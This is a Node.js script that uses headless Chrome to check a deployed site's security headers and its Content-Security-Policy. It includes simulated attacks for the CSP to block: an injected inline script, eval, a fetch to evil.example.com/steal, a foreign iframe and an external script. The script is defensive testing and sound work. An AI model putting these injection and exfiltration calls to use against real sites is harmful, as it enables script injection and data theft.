// Real-browser check of a running site (local `vite preview` or your deployed URL):
//   npm run verify:site -- https://ez.example.com
// Needs Google Chrome; set CHROME_PATH if it isn't in the usual place. Exits 1 if anything is wrong.
import puppeteer from 'puppeteer-core'
import { existsSync } from 'node:fs'

const base = (process.argv[2] ?? 'http://localhost:4173').replace(/\/$/, '')
const CANDIDATES = [
  process.env.CHROME_PATH,
  '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome',
  '/usr/bin/google-chrome',
  '/usr/bin/google-chrome-stable',
  '/usr/bin/chromium',
]
const executablePath = CANDIDATES.find((p) => p && existsSync(p))
if (!executablePath) {
  console.error('Chrome not found. Set CHROME_PATH.')
  process.exit(1)
}
const browser = await puppeteer.launch({ executablePath, headless: 'new', args: ['--no-sandbox'] })
const page = await browser.newPage()
const violations = []
const consoleErrors = []
page.on('console', (m) => {
  if (m.type() === 'error') consoleErrors.push(m.text())
})
await page.exposeFunction('__report', (v) => violations.push(v))
await page.evaluateOnNewDocument(() => {
  document.addEventListener('securitypolicyviolation', (e) =>
    window.__report(`${e.violatedDirective} -> ${e.blockedURI}`),
  )
})
const res = await page.goto(`${base}/login`, { waitUntil: 'networkidle0' })
const headers = res.headers()
await new Promise((r) => setTimeout(r, 2500))
const before = violations.length
const out = {
  csp_header: !!headers['content-security-policy'],
  rendered: await page.evaluate(() => !!document.querySelector('form')),
  fonts_loaded: await page.evaluate(
    () => [...document.fonts].filter((f) => f.status === 'loaded').length,
  ),
  sw_registered: await page.evaluate(
    async () => (await navigator.serviceWorker.getRegistrations()).length,
  ),
  violations_from_normal_use: [...violations],
  console_errors: consoleErrors.filter(
    (e) => !/ERR_NAME_NOT_RESOLVED|Failed to load resource/.test(e),
  ),
}
// Attacks must be BLOCKED (each should add a violation)...
await page.evaluate(() => {
  const s = document.createElement('script')
  s.textContent = 'window.__pwned = 1'
  document.head.appendChild(s)
})
await page.evaluate(() => {
  try {
    new Function('return 1')()
  } catch {}
})
await page.evaluate(() => fetch('https://evil.example.com/steal').catch(() => {}))
await page.evaluate(() => {
  const i = document.createElement('iframe')
  i.src = 'https://evil.example.com'
  document.body.appendChild(i)
})
await page.evaluate(() => {
  const s = document.createElement('script')
  s.src = 'https://cdn.evil.example.com/x.js'
  document.head.appendChild(s)
})
await new Promise((r) => setTimeout(r, 500))
out.attacks_blocked = violations.slice(before)
out.inline_script_ran = await page.evaluate(() => window.__pwned === 1)
// ...while Supabase must be ALLOWED (a network error is fine; a CSP violation is not).
const b2 = violations.length
await page.evaluate(() =>
  fetch('https://abcdefghijklmnop.supabase.co/auth/v1/health').catch(() => {}),
)
await new Promise((r) => setTimeout(r, 800))
out.supabase_blocked_by_csp = violations.slice(b2)
await browser.close()

const problems = []
const need = (ok, msg) => {
  if (!ok) problems.push(msg)
}
need(out.csp_header, 'No Content-Security-Policy header on /login')
for (const h of [
  'strict-transport-security',
  'x-content-type-options',
  'x-frame-options',
  'referrer-policy',
  'permissions-policy',
])
  need(headers[h], `Missing ${h} header`)
need(out.rendered, 'The sign-in form did not render')
need(
  out.sw_registered >= 1 || base.startsWith('http://'),
  'Service worker did not register (needs HTTPS)',
)
need(
  out.violations_from_normal_use.length === 0,
  `CSP blocked normal use: ${out.violations_from_normal_use.join('; ')}`,
)
need(out.console_errors.length === 0, `Console errors: ${out.console_errors.join('; ')}`)
need(
  out.attacks_blocked.length >= 4 && !out.inline_script_ran,
  'CSP did not block injected scripts / foreign origins',
)
need(out.supabase_blocked_by_csp.length === 0, 'CSP blocks Supabase connections')
console.log(JSON.stringify(out, null, 2))
if (problems.length) {
  console.error('\nFAILED:\n - ' + problems.join('\n - '))
  process.exit(1)
}
console.log('\n✓ Site headers and CSP look right.')
